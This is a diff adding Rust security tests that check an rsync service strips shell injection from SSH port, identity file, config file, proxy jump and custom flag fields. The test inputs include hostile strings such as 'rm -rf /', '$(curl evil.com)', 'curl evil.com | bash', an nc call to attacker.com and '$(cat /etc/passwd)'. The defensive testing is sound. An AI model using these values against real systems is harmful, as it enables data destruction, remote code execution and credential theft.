@@ -960,4 +960,430 @@ mod tests {
             "Should not include any part of invalid option"
         );
     }
+
+    // ========== Security Tests: SSH Port Injection ==========
+
+    #[test]
+    fn test_ssh_port_injection_semicolon_blocked() {
+        // Attempt command injection via SSH port field with semicolon
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.ssh_config = Some(SshConfig {
+            enabled: true,
+            port: Some("22; rm -rf /".to_string()),
+            identity_file: None,
+            config_file: None,
+            disable_host_key_checking: None,
+            proxy_jump: None,
+            custom_ssh_options: None,
+        });
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
+        let ssh_cmd = &args[e_idx + 1];
+
+        // The malicious port should be rejected entirely
+        assert!(
+            !ssh_cmd.contains("rm -rf"),
+            "Should not contain injected command: {}",
+            ssh_cmd
+        );
+        assert!(
+            !ssh_cmd.contains("-p 22;"),
+            "Should not contain partial malicious port"
+        );
+    }
+
+    #[test]
+    fn test_ssh_port_injection_command_substitution_blocked() {
+        // Attempt command injection via SSH port with $()
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.ssh_config = Some(SshConfig {
+            enabled: true,
+            port: Some("$(curl evil.com)".to_string()),
+            identity_file: None,
+            config_file: None,
+            disable_host_key_checking: None,
+            proxy_jump: None,
+            custom_ssh_options: None,
+        });
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
+        let ssh_cmd = &args[e_idx + 1];
+
+        assert!(
+            !ssh_cmd.contains("$("),
+            "Should not contain command substitution: {}",
+            ssh_cmd
+        );
+        assert!(
+            !ssh_cmd.contains("curl"),
+            "Should not contain injected curl command"
+        );
+    }
+
+    #[test]
+    fn test_ssh_port_injection_backtick_blocked() {
+        // Attempt command injection via SSH port with backticks
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.ssh_config = Some(SshConfig {
+            enabled: true,
+            port: Some("`whoami`".to_string()),
+            identity_file: None,
+            config_file: None,
+            disable_host_key_checking: None,
+            proxy_jump: None,
+            custom_ssh_options: None,
+        });
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
+        let ssh_cmd = &args[e_idx + 1];
+
+        assert!(
+            !ssh_cmd.contains('`'),
+            "Should not contain backticks: {}",
+            ssh_cmd
+        );
+        assert!(
+            !ssh_cmd.contains("whoami"),
+            "Should not contain injected command"
+        );
+    }
+
+    // ========== Security Tests: SSH Identity File Injection ==========
+
+    #[test]
+    fn test_ssh_identity_injection_semicolon_blocked() {
+        // Attempt command injection via identity file path
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.ssh_config = Some(SshConfig {
+            enabled: true,
+            port: None,
+            identity_file: Some("/key; rm -rf /".to_string()),
+            config_file: None,
+            disable_host_key_checking: None,
+            proxy_jump: None,
+            custom_ssh_options: None,
+        });
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
+        let ssh_cmd = &args[e_idx + 1];
+
+        assert!(
+            !ssh_cmd.contains("rm -rf"),
+            "Should not contain injected command: {}",
+            ssh_cmd
+        );
+        assert!(
+            !ssh_cmd.contains(';'),
+            "Should not contain semicolon in identity path"
+        );
+    }
+
+    #[test]
+    fn test_ssh_identity_injection_command_substitution_blocked() {
+        // Attempt command injection via identity file with $()
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.ssh_config = Some(SshConfig {
+            enabled: true,
+            port: None,
+            identity_file: Some("/home/user/.ssh/$(malicious)".to_string()),
+            config_file: None,
+            disable_host_key_checking: None,
+            proxy_jump: None,
+            custom_ssh_options: None,
+        });
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
+        let ssh_cmd = &args[e_idx + 1];
+
+        assert!(
+            !ssh_cmd.contains("$("),
+            "Should not contain command substitution: {}",
+            ssh_cmd
+        );
+        assert!(
+            !ssh_cmd.contains("malicious"),
+            "Should not contain injected term"
+        );
+    }
+
+    #[test]
+    fn test_ssh_identity_injection_pipe_blocked() {
+        // Attempt command injection via identity file with pipe
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.ssh_config = Some(SshConfig {
+            enabled: true,
+            port: None,
+            identity_file: Some("/key|nc attacker.com 4444".to_string()),
+            config_file: None,
+            disable_host_key_checking: None,
+            proxy_jump: None,
+            custom_ssh_options: None,
+        });
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
+        let ssh_cmd = &args[e_idx + 1];
+
+        assert!(
+            !ssh_cmd.contains('|'),
+            "Should not contain pipe character: {}",
+            ssh_cmd
+        );
+        assert!(
+            !ssh_cmd.contains("nc attacker"),
+            "Should not contain injected command"
+        );
+    }
+
+    // ========== Security Tests: Custom Flags ==========
+
+    #[test]
+    fn test_custom_flags_safe_passed_through() {
+        // Valid, safe custom flags should be passed to rsync
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.config.custom_flags = "--checksum --ignore-existing".to_string();
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        assert!(
+            args.contains(&"--checksum".to_string()),
+            "Should contain --checksum flag"
+        );
+        assert!(
+            args.contains(&"--ignore-existing".to_string()),
+            "Should contain --ignore-existing flag"
+        );
+    }
+
+    #[test]
+    fn test_custom_flags_with_values_passed_through() {
+        // Custom flags with values should work
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.config.custom_flags = "--bwlimit=1000 --timeout=300".to_string();
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        assert!(
+            args.contains(&"--bwlimit=1000".to_string()),
+            "Should contain --bwlimit flag"
+        );
+        assert!(
+            args.contains(&"--timeout=300".to_string()),
+            "Should contain --timeout flag"
+        );
+    }
+
+    #[test]
+    fn test_custom_flags_empty_ignored() {
+        // Empty or whitespace-only custom flags should be ignored
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.config.custom_flags = "   ".to_string();
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should have base flags but no extra empty args
+        assert!(args.contains(&"-D".to_string()), "Should have base flags");
+        // Verify no empty strings in args
+        assert!(
+            !args.iter().any(|a| a.trim().is_empty()),
+            "Should not contain empty args"
+        );
+    }
+
+    #[test]
+    fn test_custom_flags_quoted_values() {
+        // Custom flags with quoted values (shell_words parses these)
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.config.custom_flags = r#"--filter="exclude *.tmp""#.to_string();
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // shell_words should parse the quoted value correctly
+        assert!(
+            args.iter().any(|a| a.contains("exclude *.tmp")),
+            "Should contain filter with parsed quoted value: {:?}",
+            args
+        );
+    }
+
+    // ========== Security Tests: Custom Flags Injection ==========
+
+    #[test]
+    fn test_custom_flags_shell_injection_via_unbalanced_quotes() {
+        // Unbalanced quotes should cause shell_words to return error
+        // and the flags should NOT be added
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.config.custom_flags = r#"--exclude="incomplete"#.to_string(); // Unbalanced quote
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // The malformed flag should be rejected (logged error, not added)
+        // We verify by checking that the incomplete flag is not present
+        assert!(
+            !args.iter().any(|a| a.contains("incomplete")),
+            "Should reject malformed flags with unbalanced quotes: {:?}",
+            args
+        );
+    }
+
+    // ========== Security Tests: Proxy Jump Injection ==========
+
+    #[test]
+    fn test_proxy_jump_injection_blocked() {
+        // Attempt command injection via proxy jump
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.ssh_config = Some(SshConfig {
+            enabled: true,
+            port: None,
+            identity_file: None,
+            config_file: None,
+            disable_host_key_checking: None,
+            proxy_jump: Some("user@host; curl evil.com | bash".to_string()),
+            custom_ssh_options: None,
+        });
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
+        let ssh_cmd = &args[e_idx + 1];
+
+        assert!(
+            !ssh_cmd.contains("curl"),
+            "Should not contain injected curl: {}",
+            ssh_cmd
+        );
+        assert!(
+            !ssh_cmd.contains("bash"),
+            "Should not contain injected bash: {}",
+            ssh_cmd
+        );
+        assert!(
+            !ssh_cmd.contains(';'),
+            "Should not contain semicolon: {}",
+            ssh_cmd
+        );
+    }
+
+    // ========== Security Tests: Config File Injection ==========
+
+    #[test]
+    fn test_ssh_config_file_injection_blocked() {
+        // Attempt command injection via SSH config file path
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.ssh_config = Some(SshConfig {
+            enabled: true,
+            port: None,
+            identity_file: None,
+            config_file: Some("/config$(whoami)".to_string()),
+            disable_host_key_checking: None,
+            proxy_jump: None,
+            custom_ssh_options: None,
+        });
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
+        let ssh_cmd = &args[e_idx + 1];
+
+        assert!(
+            !ssh_cmd.contains("$("),
+            "Should not contain command substitution: {}",
+            ssh_cmd
+        );
+        assert!(
+            !ssh_cmd.contains("whoami"),
+            "Should not contain injected command"
+        );
+    }
+
+    // ========== Combined Security Test ==========
+
+    #[test]
+    fn test_multiple_injection_vectors_all_blocked() {
+        // Attempt multiple injection vectors at once - all should be blocked
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+        job.ssh_config = Some(SshConfig {
+            enabled: true,
+            port: Some("22; whoami".to_string()),
+            identity_file: Some("/key$(cat /etc/passwd)".to_string()),
+            config_file: Some("/config|bash".to_string()),
+            disable_host_key_checking: None,
+            proxy_jump: Some("user@host`id`".to_string()),
+            custom_ssh_options: Some("${PATH}".to_string()),
+        });
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
+        let ssh_cmd = &args[e_idx + 1];
+
+        // None of the injection attempts should appear in the final command
+        assert!(
+            !ssh_cmd.contains("whoami"),
+            "Should not contain whoami injection"
+        );
+        assert!(
+            !ssh_cmd.contains("passwd"),
+            "Should not contain passwd injection"
+        );
+        assert!(
+            !ssh_cmd.contains("|bash"),
+            "Should not contain pipe bash injection"
+        );
+        assert!(!ssh_cmd.contains("`id`"), "Should not contain id injection");
+        assert!(
+            !ssh_cmd.contains("${PATH}"),
+            "Should not contain PATH injection"
+        );
+
+        // The SSH command should still be "ssh" with minimal options
+        assert!(
+            ssh_cmd.starts_with("ssh"),
+            "Should still start with ssh: {}",
+            ssh_cmd
+        );
+    }
 }
